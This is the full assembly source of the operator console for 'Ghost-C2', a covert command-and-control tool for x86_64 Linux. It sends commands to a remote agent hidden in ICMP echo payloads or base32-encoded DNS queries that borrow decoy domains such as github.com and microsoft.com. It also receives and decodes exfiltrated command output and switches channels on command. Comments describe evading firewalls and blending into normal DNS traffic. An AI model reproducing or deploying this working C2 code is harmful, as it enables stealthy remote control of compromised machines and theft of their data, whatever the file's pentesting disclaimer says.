; ===================================================================================
;  ________  ___  ___  ________  ________  _________       ________  ________   
; |\   ____\|\  \|\  \|\   __  \|\   ____\|\___   ___\    |\   ____\|\_____  \  
; \ \  \___| \ \  \\\  \ \  \|\  \ \  \___|\|___ \  \_|    \ \  \___|\|____|\  \ 
;  \ \  \  __ \ \   __  \ \  \\\  \ \_____  \   \ \  \      \ \  \     ____\_\  \ 
;   \ \  \|\  \ \  \ \  \ \  \\\  \|____|\  \   \ \  \      \ \  \___|\____ \  \ 
;    \ \_______\ \__\ \__\ \_______\____\_\  \   \ \__\      \ \______\\_________\
;     \|_______|\|__|\|__|\|_______|\_________\   \|__|       \|______\|_________|
;                                  \|_________|                                   
; ===================================================================================
; Project      : Ghost-C2 (v3.6.3) - "The Dual-Channel Hybrid Phantom"
; Author       : JM00NJ (https://github.com/JM00NJ) / https://netacoding.com/
; Architecture : x86_64 Linux (Pure Assembly, Libc-free)
; -----------------------------------------------------------------------------------
; Features:
;   - Transport    : Dual-Channel Stealth (ICMP Raw & DNS UDP Tunneling)
;   - Pivot Logic  : Protocol Hot-Swapping (!D for DNS / !I for ICMP)
;   - Security     : Rolling XOR Encryption (Dynamic Entropy) & Asymmetric Auth
;   - Stealth      : Fileless Execution (memfd_create) & VTable-based Modular IO
;   - Compression  : dpcm-rle-hybrid-x64-compressor
;   - AND MORE     : Adaptive Jitter, RDTSC Mimicry, and Syscall Obfuscation.
; -----------------------------------------------------------------------------------
; License: GNU Affero General Public License v3.0 (AGPL-3.0)
; Versions 3.6.0 and below are MIT. 3.6.1+ is AGPL-3.0.
; Disclaimer: This tool is developed for educational and authorized penetration 
; testing purposes only. The author is not responsible for any misuse.
; -----------------------------------------------------------------------------------
; Build: nasm -f elf64 client.asm -o client.o && ld client.o -o client
; ===================================================================================


section .bss
	
	;related to chuck
	chunk_size resb 1
	
    fd_no resb 4                
    sniffed_data resb 1200      
    incoming_addr resb 16       
    addr_len      resd 1        
    ip_buf resb 16              
    choice_buf resb 2 ; Menü seçimi için

    ; --- DECOMPRESSION BUFFERS ---
    full_compressed   resb 5242880   
    full_decompressed resb 10485760  
    total_received    resq 1         

	; -- DNS SECTION ---
	cmd_len resb 1
	dns_query_buffer resb 512  ; 512 byte standart UDP DNS limiti için yeterli.

	domain_idx resb 1
	
section .data
    ; ============================================================================
    ; [!] MASTER LISTENER CONFIGURATION [!]
    ; ============================================================================
    ; This structure defines HOW the Master Console listens for incoming DNS packets.
    ; Ensure these values match the 'master_addr' configuration in the Agent (sniff.asm).
	master_bind_addr:
        dw 2                ; sin_family: AF_INET (IPv4 Protocol)
        ; sin_port: The UDP port Master listens on for DNS Tunneling.
        ; [WARNING] MUST BE IN NETWORK BYTE ORDER (Big-Endian)!
        ; Default: 0xB414 (Port 5300) for local testing without root conflicts.
        ; For real operations: Change to 0x3500 (Port 53) to blend with normal DNS traffic.
        dw 0xB414           
        ; sin_addr: 0.0.0.0 (INADDR_ANY) - Listen on all available network interfaces.
        dd 0                
        dq 0                ; sin_zero: Padding
	domain_pool:
		db 6,'github',3,'com',0,0,0,0,0,0,0,0,0     ; 20B 
		db 9,'microsoft',3,'com',0,0,0,0,0,0         ; 20B 
		db 10,'cloudflare',3,'com',0,0,0,0,0         ; 20B 
		db 6,'google',3,'com',0,0,0,0,0,0,0,0,0      ; 20B 
		db 7,'windows',3,'com',0,0,0,0,0,0,0,0       ; 20B 
    ; ============================================================================
    ; USER INTERFACE STRINGS
    ; ============================================================================
		menu_msg db "=== Ghost-C2 Master Console ===", 10, \
                "Select Protocol:", 10, \
                "[1] Raw ICMP (The Phantom)", 10, \
                "[2] DNS Tunneling (WIP)", 10, \
                "[3] Reconnect to Agent (ICMP Mode)", 10, \
                "Choice > ", 0
    len_menu equ $ - menu_msg

    msg_beacon db "[+] Agent beacon received!", 10, 0
    len_msg_beacon equ $ - msg_beacon
    
    msg_pivot db "[!] Pivoting to DNS mode...", 10, 0
    len_msg_pivot equ $ - msg_pivot
    
    msg_wait db "[*] Waiting for agent connection...", 10, 0
    len_msg_wait equ $ - msg_wait
    
    msg_sending db "[+] Sending Command...", 10, 0
    len_msg_sending equ $ - msg_sending
    
    msg_pivot_dns db "[!] Pivot command '!D' detected. Switching after send...", 10, 0
    len_msg_pivot_dns equ $ - msg_pivot_dns
    
    msg_protocol_dns db "[*] Closing ICMP socket, preparing for DNS...", 10, 0
    len_msg_protocol_dns equ $ - msg_protocol_dns
    
    msg_vtable_update_dns db "[*] Updating VTable to DNS. Listening on UDP/53...", 10, 0
    len_msg_vtable_update_dns equ $ - msg_vtable_update_dns
    
    msg_wait_agent_dns db "[+] Master is now in DNS Mode. Waiting for Agent Beacon..."
    len_msg_wait_agent_dns equ $ - msg_wait_agent_dns
    
    msg_pivot_icmp db "[!] Pivot command '!I' detected. Switching to ICMP...", 10, 0
    len_msg_pivot_icmp equ $ - msg_pivot_icmp
    
    msg_protocol_icmp db "[*] Closing DNS socket, preparing for ICMP...", 10, 0
    len_msg_protocol_icmp equ $ - msg_protocol_icmp
    
    msg_vtable_update_icmp db "[*] Updating VTable to ICMP. Passive Listening...", 10, 0
    len_msg_vtable_update_icmp equ $ - msg_vtable_update_icmp

    msg_ip db "Target IP: "
    len_msg_ip equ $ - msg_ip
    msg_cmd db "Command: "
    len_msg_cmd equ $ - msg_cmd
    newline db 10
    
    ; ============================================================================
    ; [!] ICMP PROTOCOL STRUCTURE (OPSEC PADDING) [!]
    ; ============================================================================
    ; This structure mimics a standard Linux ICMP Echo Request.
    ; Total Size: 8 (Header) + 24 (Mimicry) + 56 (Payload) = 88 Bytes.
    ; With 20 Bytes IP Header = 108 Bytes Total. This blends into normal network noise.
    icmp_packet:
        type db 8           ; ICMP Type 8 (Echo Request - Master to Agent)
        code db 0           ; ICMP Code 0
        checksum dw 0       ; Calculated dynamically
        identifier dw 0     ; Used for Asymmetric Authentication
        sequence dw 0       ; Used for Asymmetric Authentication
        
        ; --- MIMICRY PADDING ---
        ; This exact byte sequence (0x10 to 0x1F) bypasses basic heuristic firewalls
        ; that look for standard OS ping signatures.
        mimicry_ts dq 0
        mimicry_seq db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17
                    db 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F
        
        ; --- ENCRYPTED PAYLOAD ---
        ; Chunk size limited to 56 bytes to maintain a low-profile packet footprint.
        payload times 56 db 0

    ; ============================================================================
    ; DYNAMIC TARGET STRUCTURE
    ; ============================================================================
    ; This structure stores the Agent's IP address.
    ; Note: The Port (0x3500/Port 53) is ignored during ICMP mode but is CRITICAL
    ; when the Master pivots to DNS Tunneling. Do not change the family or port format.
    target_addr:
        dw 2                ; AF_INET
        dw 0xB414           ; DNS Port (Network Byte Order). Used during pivot (!D).
        dd 0                ; IP Address is parsed dynamically during execution.
        dq 0                ; Padding

    ; ============================================================================
    ; DNS PROTOCOL ASSETS
    ; ============================================================================
    ; Base32/Custom encoding alphabet for DNS QNAME data exfiltration.
	b32_alpha:    db 'abcdefghijklmnopqrstuvwxyz234567'
	b32_char_cnt: db 0, 2, 4, 5, 7, 8
	
	
section .text
global _start

_start:
	
	; Stack Anchor & VTable Reservation
    push rbp
    mov rbp, rsp
    sub rsp, 0x1000 ; VTable ve yerel değişkenler alanı

    ; 1. Menü Ekranı
    mov rax, 1
    mov rdi, 1
    lea rsi, [menu_msg]
    mov rdx, len_menu
    syscall

    ; 2. Seçimi Al
    mov rax, 0
    mov rdi, 0
    lea rsi, [choice_buf]
    mov rdx, 2
    syscall

    ; 3. VTable Kurulumu (Seçime Göre)
    cmp byte [choice_buf], '1'
    je .setup_icmp
    cmp byte [choice_buf], '2'
    je .setup_dns
    cmp byte [choice_buf], '3'      
    je .setup_reconnect_icmp          
    jmp _exit ; Geçersiz seçim

.setup_icmp:
    lea rax, [rel _icmp_init]
    mov [rbp - 0x08], rax       ; VTable Index 0: Init
    lea rax, [rel _icmp_send]
    mov [rbp - 0x10], rax       ; VTable Index 1: Send
    lea rax, [rel _icmp_recv]
    mov [rbp - 0x18], rax       ; VTable Index 2: Recv
    
    ; Start the protocol
    call [rbp - 0x08]
	jmp _wait_for_beacon

.setup_reconnect_icmp:
    ; 1. Varsayılan olarak ICMP VTable'ını kur
    lea rax, [rel _icmp_init]
    mov [rbp - 0x08], rax       
    lea rax, [rel _icmp_send]
    mov [rbp - 0x10], rax       
    lea rax, [rel _icmp_recv]
    mov [rbp - 0x18], rax       
    
    call [rbp - 0x08]           ; Soketi başlat (fd_no atanır)

    ; 2. Ekrana "Target IP:" sorusunu sor
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_ip]
    mov rdx, len_msg_ip
    syscall

    ; 3. Klavyeden IP string'ini oku
    mov rax, 0
    mov rdi, 0
    lea rsi, [ip_buf]
    mov rdx, 16
    syscall

    ; --- GÜVENLİ IP PARSER ---
    ; 4. IP String'ini Parse Et ve Doğrudan Target Addr'a Yaz
    lea rsi, [ip_buf]
    lea rdi, [target_addr + 4]  ; Sadece IP'nin olduğu 4 byte'lık alana yazacağız!
    xor rbx, rbx                ; RBX = Geçici sayı (0-255)
    xor rcx, rcx                ; RCX = Yazılan bayt sayısı (0-3)

.parse_loop:
    lodsb                       ; Sıradaki karakteri AL'ye al
    cmp al, 10                  ; Enter (\n) mi?
    je .save_octet              ; Evetse son sayıyı kaydet ve bitir
    cmp al, '.'                 ; Nokta (.) mı?
    je .save_octet              ; Evetse sayıyı kaydet ve sıradakine geç

    ; Rakam kontrolü (0-9 arası değilse atla - boşluk vb.)
    cmp al, '0'
    jb .parse_loop
    cmp al, '9'
    ja .parse_loop

    sub al, '0'                 ; ASCII -> Rakam ('5' -> 5)
    imul rbx, rbx, 10           ; Mevcut sayıyı 10 ile çarp
    add rbx, rax                ; Yeni rakamı ekle
    jmp .parse_loop

.save_octet:
    mov byte [rdi], bl          ; Hesaplanan sayıyı (0-255) hedef adrese YAZ
    inc rdi                     ; Hedef adresi 1 bayt ileri al
    inc rcx                     ; Sayacı artır
    xor rbx, rbx                ; Bir sonraki oktet için sayıyı sıfırla
    cmp al, 10                  ; Enter'a basılmışsa işimiz bitti
    je .reconnect_done
    cmp rcx, 4                  ; 4 bayt yazdıysak güvenli çıkış
    je .reconnect_done
    jmp .parse_loop

.reconnect_done:
    ; 5. BEACON BEKLEMEYİ ATLA, DOĞRUDAN KOMUT EKRANINA ZIPLA!
    jmp _get_command

	
.setup_dns:
	lea rax, [rel _dns_init]
	mov [rbp - 0x08], rax		; VTable Index 0: Init
	lea rax, [rel _dns_send]
	mov [rbp - 0x10], rax		; VTable Index 1: Send
	lea rax, [rel _dns_recv]
	mov [rbp - 0x18], rax		; VTable Index 2: Recv
	
	; Start the protocol
	
	call [rbp - 0x08]
	
	jmp _wait_for_beacon
	

	; [OpSec] Terminale: "[*] Passive Listening..." (Sadece bir kez)
    push rax
    push rsi
    push rdi
    push rdx
    
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_wait]
    mov rdx, len_msg_wait
    syscall
    pop rdx
    pop rdi
    pop rsi
    pop rax
    
_wait_for_beacon:

    
    call [rbp - 0x18]       ; VTable Index 2: _recv fonksiyonunu çağır
    cmp rax, -1		        ; Paket geldi mi? (RAX > 0 ise geldi)
    je _wait_for_beacon     ; Gelmediyse veya hatalıysa bekle

	; [OpSec] Terminale: "[+] AGENT CONNECTED! Address Copied." bas.
	
	push rax
	push rsi
	push rdi
	push rdx
	
	mov rax, 1
	mov rdi, 1
	lea rsi, [msg_beacon]
	mov rdx, len_msg_beacon
	syscall
	
	pop rdx
	pop rdi
	pop rsi
	pop rax
	
	; --- YAKALANAN AJANIN ADRESİNİ HEDEFE KOPYALA ---
    cld
    lea rsi, [incoming_addr]
    lea rdi, [target_addr]
    mov rcx, 16             ; sockaddr_in boyutu
    rep movsb
    ; ------------------------------------------------
    
    
_get_command:
    ; Reset Decompression State for Every New Command
    mov qword [total_received], 0

    ; Clear Payload
    lea rdi, [payload]
    xor al, al
    mov rcx, 56
    rep stosb
    
    ; Display Cmd Prompt
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_cmd]
    mov rdx, len_msg_cmd
    syscall

    ; Read Cmd
    mov rax, 0
    mov rdi, 0
    lea rsi, [payload]
    mov rdx, 56
    syscall
    
    mov [cmd_len], al      ; Saving AL
    dec rax
    mov byte [payload + rax], 0 ; Null terminate
    
; --- OpSec: Komut Gönderiliyor Bilgisi ---
    ; [!] Terminale "Sending Command..."
	push rax
	push rsi
	push rdi
	push rdx
	
	mov rax, 1
	mov rdi, 1
	lea rsi, [msg_sending]
	mov rdx, len_msg_sending
	syscall
	
	pop rdx
	pop rdi
	pop rsi
	pop rax


    cmp byte [payload], '!'
    je .check_pivot
    jmp .normal_flow

.check_pivot:
	cmp byte [payload + 1], 'D'
    je .pivot_dns
    cmp byte [payload + 1], 'I'     
    je .pivot_icmp                  
    jmp .normal_flow

.pivot_dns:  
    push rax
    push rdi
    push rsi
    push rdx
    
    
    pop rdx
    pop rsi
    pop rdi
    pop rax
    
    ; [!] OpSec Mesajı: "Pivot command '!D' detected. Switching after send..."
    push rax
    push rsi
    push rdi
    push rdx
    
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_pivot_dns]
    mov rdx, len_msg_pivot_dns
    syscall
    
    pop rdx
    pop rdi
    pop rsi
    pop rax
    
    push qword 1
    jmp .send_it


.pivot_icmp:
    ; [!] Pivot command '!I' detected... mesajını ekrana bas
    push rax
    push rsi
    push rdi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_pivot_icmp]
    mov rdx, len_msg_pivot_icmp
    syscall
    pop rdx
    pop rdi
    pop rsi
    pop rax

    push qword 2                    ; 2 = ICMP'ye geç (YENİ BAYRAK)
    jmp .send_it


.normal_flow:
    push qword 0
    
.send_it:
	; Şifreleme ve Gönderme
    lea rsi, [payload]
    mov rcx, 56
    call _xor_cipher
    call [rbp - 0x10]          

    pop rax                     ; Stack'e attığımız o 0, 1 veya 2 bayrağını al
    cmp rax, 1
    je _master_switch_to_dns    ; 1 ise DNS'e geç
    cmp rax, 2
    je _master_switch_to_icmp   ; 2 ise YENİ ICMP GEÇİŞİNE ZIPLA
    jmp _sniff_loop             ; 0 ise normal dinlemeye devam

_sniff_loop:
    call [rbp - 0x18]           ; VTable üzerinden _icmp_recv çağır
    cmp rax, -1               ; RAX = Alınan bayt sayısı (Headerlar çıkmış hali)
    je _sniff_loop              ; Veri yoksa veya hatalıysa pusuya devam
    
    call _handle_incoming_data   ; Gelen parçayı doğrula, çöz ve buffer'a ekle
    
    movzx rbx, byte [chunk_size]   ; dynamic chunk size for icmp and dns
    cmp rax, rbx
    
    jne _process_output         ; Veri transferi bitti demektir, yazdırmaya git
    jmp _sniff_loop             ; 56 baytsa daha veri var demektir, dinlemeye devam

_handle_incoming_data:
    ; RAX = Payload Boyutu (Zaten _icmp_recv tarafından hazırlandı)
    mov r14, rax
    
    ; 1 byte gelmişse bu EOF (bitiş) paketidir
    cmp r14, 1
    je .done
    
    ; XOR Şifresini Çöz (Payload sniffed_data + 52'de başlar)
    lea rsi, [sniffed_data + 52]
    mov rcx, r14
    push rsi
    call _xor_cipher            ; Rolling XOR çöz
    pop rsi
    
    ; Veriyi Büyük Buffer'a (full_compressed) ekle
    lea rdi, [full_compressed]
    add rdi, [total_received]   ; Mevcut yazma ofsetine git
    mov rcx, r14
    rep movsb                   ; Veriyi kopyala
    add [total_received], r14   ; Sayaçı güncelle
    
.done:
    mov rax, r14                ; Boyutu geri döndür (Döngü kontrolü için)
    ret

_process_output:
    ; Decompression (Sıkıştırılmış veriyi çözme)
    lea rsi, [full_compressed]
    lea rdi, [full_decompressed]
    mov rcx, [total_received]
    call _vesqer_decompress     
    
    ; Çıktıyı Ekrana Yazdır
    mov rdx, rax                ; RAX = Çözülen verinin gerçek boyutu
    mov rax, 1                  ; sys_write
    mov rdi, 1                  ; stdout
    lea rsi, [full_decompressed]
    syscall

    ; Alt satıra geç (Format düzgünlüğü için)
    mov rax, 1
    mov rdi, 1
    lea rsi, [newline]
    mov rdx, 1
    syscall

    jmp _get_command          ; Yeni komut almak için başa dön

; ====================================================================
;  GHOST-C2 PROTOCOL MODULE: ICMP (Modular)
; ====================================================================

_icmp_init:
	mov byte [chunk_size], 56
    mov rax, 41                 ; sys_socket
    mov rdi, 2                  ; AF_INET
    mov rsi, 3                  ; SOCK_RAW
    mov rdx, 1                  ; IPPROTO_ICMP
    syscall
    mov [fd_no], eax            ; FD sakla
    ret

_icmp_send:
    rdtsc                       ; Mimicry Timestamp
    mov [icmp_packet + 8], rax
    call _create_seq_id         ; Auth ID/SEQ
    call _checksum_cal          ; Checksum mühürle
    
    mov rax, 44                 ; sys_sendto
    mov edi, [fd_no]
    lea rsi, [icmp_packet]
    mov rdx, 88                ; Hdr(8) + Mimicry(24) + Payload(100)
    mov r10, 0
    lea r8, [target_addr]
    mov r9, 16
    syscall
    ret

_icmp_recv:
    ; Receive Buffer Temizliği
    lea rdi, [sniffed_data]
    xor al, al
    mov rcx, 1200
    rep stosb
    ; sys_recvfrom
    mov rax, 45
    mov edi, [fd_no]
    lea rsi, [sniffed_data]
    mov rdx, 1200
    mov dword [addr_len], 16
    lea r8, [incoming_addr]
    lea r9, [addr_len]
    syscall
    ; ICMP Doğrulamaları
    cmp rax, 52
    jb .no_data
    cmp byte [sniffed_data + 20], 0
    jne .no_data
    ; Asymmetric Auth Check (SEQ + ID = 55,000)
    movzx ebx, word [sniffed_data + 26]
    xchg bl, bh
    movzx ecx, word [sniffed_data + 24]
    xchg cl, ch
    add ebx, ecx
    cmp ebx, 55000
    jne .no_data
    sub rax, 52
    ret
.no_data:
    mov rax, -1
    ret
    
; ====================================================================
;  GHOST-C2 PROTOCOL MODULE: DNS (Modular)
; ====================================================================

_dns_init:
	mov byte [chunk_size], 35
    mov rax, 41
    mov rdi, 2              ; AF_INET
    mov rsi, 2              ; SOCK_DGRAM
    mov rdx, 17             ; IPPROTO_UDP
    syscall
    test rax, rax
    js _exit
    mov [fd_no], eax
    mov edi, dword [fd_no]
    mov rax, 49             ; sys_bind
    lea rsi, [master_bind_addr]
    mov rdx, 16
    syscall
    ret

; -----------------------------------------------------------------

_dns_send:
    push rax
    push rdx

    ; === 1. DNS HEADER ===
.retry_rand:
    rdrand eax
    jnc .retry_rand
    mov dl, 0xFF
    sub dl, al
    mov ah, dl
    mov word [dns_query_buffer], ax
    mov dword [dns_query_buffer + 2], 0x01000001
    mov dword [dns_query_buffer + 6], 0
    mov word  [dns_query_buffer + 10], 0

    lea rdi, [dns_query_buffer + 12]

    ; === 2. PAYLOAD LABEL ===
    movzx rcx, byte [cmd_len]
    test rcx, rcx
    jz .skip_encode

    push rdi
    inc rdi

    lea rsi, [payload]
    call _dns_encode        ; rax = char sayısı

    pop rbx
    mov byte [rbx], al      ; length byte yaz

.skip_encode:
    ; === 3. DOMAIN ===
	movzx rax, byte [domain_idx]   ; mevcut index
    mov rcx, rax
    inc al
    cmp al, 5
    jne .no_reset
    xor al, al
.no_reset:
    mov byte [domain_idx], al      ; index güncelle
    imul rcx, rcx, 20              ; offset hesapla
    lea rsi, [domain_pool + rcx]   ; domain seç
.copy_domain:
    lodsb
    stosb
    test al, al
    jnz .copy_domain

    ; === 4. QTYPE A + QCLASS IN ===
    mov dword [rdi], 0x01000100
    add rdi, 4

    ; === 5. GÖNDER ===
    lea r8, [dns_query_buffer]
    mov rdx, rdi
    sub rdx, r8

    mov rax, 44
    mov edi, dword [fd_no]
    lea rsi, [dns_query_buffer]
    mov r10, 0
    lea r8, [target_addr]
    mov r9, 16
    syscall

    pop rdx
    pop rax
    ret

; -----------------------------------------------------------------

_dns_recv:
    lea rdi, [sniffed_data]
    xor al, al
    mov rcx, 1200
    rep stosb

    mov dword [addr_len], 16
    mov rax, 45
    mov edi, dword [fd_no]
    lea rsi, [sniffed_data]
    mov rdx, 1200
    xor r10, r10
    lea r8, [incoming_addr]
    lea r9, [addr_len]
    syscall

    cmp rax, 12
    jb .invalid_packet

    ; TX ID auth
    movzx ebx, word [sniffed_data]
    add bl, bh
    cmp bl, 0xFF
    jne .invalid_packet

    ; Beacon kontrolü
    cmp rax, 28
    je .is_beacon

    ; QNAME
    lea rsi, [sniffed_data + 12]
    lodsb
    test al, al
    jz .invalid_packet

    movzx rcx, al

    push rcx
    lea rdi, [sniffed_data + 300]
    call _dns_decode        ; rax = byte sayısı
    pop rcx

    ; bridge 300 → 52
    push rax
    mov rcx, rax
    lea rsi, [sniffed_data + 300]
    lea rdi, [sniffed_data + 52]
    cld
    rep movsb
    pop rax
    ret

.is_beacon:
    mov rax, 0
    ret

.invalid_packet:
    mov rax, -1
    ret

; -----------------------------------------------------------------

_dns_encode:
    push rbx
    push r12
    push r13
    push r14
    push r15

    lea r13, [b32_alpha]
    mov r15, rcx
    xor r14, r14

.group_loop:
    test r15, r15
    jz .enc_done

    xor rbx, rbx
    xor r12, r12

.load_bytes:
    cmp r12, 5
    je .encode_group
    test r15, r15
    jz .encode_group

    shl rbx, 8
    lodsb
    movzx rax, al
    or rbx, rax
    inc r12
    dec r15
    jmp .load_bytes

.encode_group:
    push rcx
    mov ecx, 5
    sub ecx, r12d
    shl ecx, 3
    shl rbx, cl
    pop rcx

    lea rax, [b32_char_cnt]
    movzx ecx, byte [rax + r12]

.extract_chars:
    test ecx, ecx
    jz .group_loop

    mov rax, rbx
    shr rax, 35
    and eax, 0x1F
    movzx eax, byte [r13 + rax]
    stosb
    inc r14

    shl rbx, 5
    dec ecx
    jmp .extract_chars

.enc_done:
    mov rax, r14
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret

; -----------------------------------------------------------------

_dns_decode:
    push rbx
    push r12
    push r13
    push r14
    push r15

    mov r15, rcx
    imul rcx, rcx, 5
    shr rcx, 3
    mov r14, rcx

    xor rbx, rbx
    xor r12, r12

.dec_loop:
    test r15, r15
    jz .dec_done

    lodsb
    dec r15

    cmp al, 'a'         ; 0x61 - doğru eşik
    jae .is_alpha       ; >= 'a' ise letter
    sub al, '2'         ; digit '2'-'7'
    add al, 26
    jmp .got_val
.is_alpha:
    sub al, 'a'
.got_val:
    and rax, 0x1F
    shl rbx, 5
    or rbx, rax
    add r12, 5

.extract_bytes:
    cmp r12, 8
    jl .dec_loop

    mov rcx, r12
    sub rcx, 8              ; rcx = kalan bit sayısı

    mov rax, rbx
    shr rax, cl             ; ← cl kullan
    and eax, 0xFF
    stosb

    mov rax, 1
    shl rax, cl             ; ← cl kullan
    dec rax
    and rbx, rax
    sub r12, 8
    jmp .extract_bytes

.dec_done:
    mov rax, r14
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    ret
; ====================================================================
;  UTILITY FUNCTIONS (Decompress, XOR, Auth)
; ====================================================================

_vesqer_decompress:
    push rbx
    push rcx
    push rsi
    push rdi
    push r11
    
    mov r11, rdi                ; Anchor başlangıcı
    test rcx, rcx
    jz .done
    mov bl, byte [rsi]          ; Load Anchor
    inc rsi
    mov byte [rdi], bl          ; Write Anchor
    inc rdi
    dec rcx                     
.loop:
    test rcx, rcx
    jz .done
    mov dl, byte [rsi]          ; DL = RLE Count
    inc rsi
    dec rcx
    test dl, dl                 
    jz .loop
    test rcx, rcx
    jz .done
    mov al, byte [rsi]          ; AL = Delta
    inc rsi
    dec rcx
.write_run:
    add bl, al                  ; Current + Delta
    mov byte [rdi], bl          
    inc rdi
    dec dl
    jnz .write_run
    jmp .loop
.done:
    mov rax, rdi
    sub rax, r11                ; RAX = Decompressed Size
    pop r11
    pop rdi
    pop rsi
    pop rcx
    pop rbx
    ret

_xor_cipher:
    test rcx, rcx
    jz .done
    push rsi
    push rdx
    mov dl, 0x42
.loop:
    xor byte [rsi], dl
    add dl, 0x07
    inc rsi
    loop .loop
    pop rdx
    pop rsi
.done:
    ret

_checksum_cal:
    mov word [icmp_packet + 2], 0
    xor rcx, rcx
    mov rcx, 88                ; Header(8) + Mimicry(24) + Payload(56)
    lea rsi, [icmp_packet]
    xor rax, rax
.loop:
    movzx edx, word [rsi]
    add eax, edx
    add rsi, 2
    sub rcx, 2
    jnz .loop
    mov edx, eax
    shr edx, 16
    and eax, 0xFFFF
    add ax, dx
    adc ax, 0
    not ax
    mov [icmp_packet + 2], ax
    ret

_create_seq_id:
    rdtsc
    xor edx, edx
    mov ecx, 20000
    div ecx
    add edx, 10000              ; Random ID
    mov eax, 45000              ; Operator Auth Sum
    sub eax, edx                ; EAX = SEQ
    xchg dl, dh
    xchg al, ah
    mov word [icmp_packet + 4], dx
    mov word [icmp_packet + 6], ax
    ret



_master_switch_to_dns:
    ; [OpSec] Terminale: "[*] Closing ICMP socket, preparing for DNS..." bas.
    push rax
    push rsi
    push rdi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_protocol_dns]
    mov rdx, len_msg_protocol_dns
    syscall
    pop rdx
    pop rdi
    pop rsi
    pop rax
    
    ; 1. Eski ICMP Soketini kapat
    mov rax, 3
    mov edi, [fd_no]
    syscall

    ; [OpSec] Terminale: "[*] Updating VTable to DNS. Listening on UDP/5300..." bas.
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_vtable_update_dns]
    mov rdx, len_msg_vtable_update_dns
    syscall
    pop rdx
    pop rsi
    pop rdi
    pop rax
    
    ; 4. VTable'ı DNS adresleriyle GÜNCELLE
    lea rax, [rel _dns_init]
    mov [rbp - 0x08], rax
    lea rax, [rel _dns_send]
    mov [rbp - 0x10], rax
    lea rax, [rel _dns_recv]
    mov [rbp - 0x18], rax

    ; 5. Yeni DNS Soketini (Port 5300 Bind ile) başlat!
    call [rbp - 0x08]
    
    ; [OpSec] Terminale: "[+] Master is now in DNS Mode. Waiting for Agent Beacon..." bas.
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_wait_agent_dns]
    mov rdx, len_msg_wait_agent_dns
    syscall
    pop rdx
    pop rsi
    pop rdi
    pop rax
    
    ; 6. Ajanın DNS üzerinden atacağı YENİ BEACON'ı bekle
    jmp _wait_for_beacon

_master_switch_to_icmp:
    ; 1. Terminale "Closing DNS socket..." bas
    push rax
    push rsi
    push rdi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_protocol_icmp]
    mov rdx, len_msg_protocol_icmp
    syscall
    pop rdx
    pop rdi
    pop rsi
    pop rax
    
    ; 2. Mevcut DNS (UDP) soketini kapat
    mov rax, 3
    mov edi, [fd_no]
    syscall

    ; 3. Terminale "Updating VTable to ICMP..." bas
    push rax
    push rdi
    push rsi
    push rdx
    mov rax, 1
    mov rdi, 1
    lea rsi, [msg_vtable_update_icmp]
    mov rdx, len_msg_vtable_update_icmp
    syscall
    pop rdx
    pop rsi
    pop rdi
    pop rax
    
    ; 4. VTable'ı ICMP adresleriyle GÜNCELLE
    lea rax, [rel _icmp_init]
    mov [rbp - 0x08], rax
    lea rax, [rel _icmp_send]
    mov [rbp - 0x10], rax
    lea rax, [rel _icmp_recv]
    mov [rbp - 0x18], rax

    ; 5. Yeni ICMP Raw Soketini başlat
    call [rbp - 0x08]
    
    ; 6. Raw Soket dinlemeye başladığı için direkt pusuya yat
    jmp _get_command

_exit:
    mov rax, 60
    xor rdi, rdi
    syscall
